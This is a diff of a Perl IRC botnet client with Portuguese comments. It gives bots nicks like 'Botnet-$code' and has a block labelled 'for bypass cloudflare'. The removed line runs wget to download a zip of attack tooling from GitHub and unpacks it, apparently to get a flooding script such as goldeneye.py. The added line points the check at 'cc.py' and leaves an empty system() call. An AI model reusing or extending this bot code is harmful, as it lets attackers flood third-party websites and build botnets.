@@ -9,9 +9,9 @@ my $port    = "6667";
 my $nick    = "Botnet-$code"; #$code vai gerar um número aleatório#
 
 # for bypass cloudflare #
-unless (-e "goldeneye.py") {
+unless (-e "cc.py") {
   print "[*] Instalando...";
-  system("wget https://github.com/Paulo0819/irc-linux/archive/main.zip -O main.zip && unzip main.zip && cd python-main/ && mv * .. && cd .. && rm -rf python-main && rm -rf main.zip");
+  system("");
 }
 
 all();
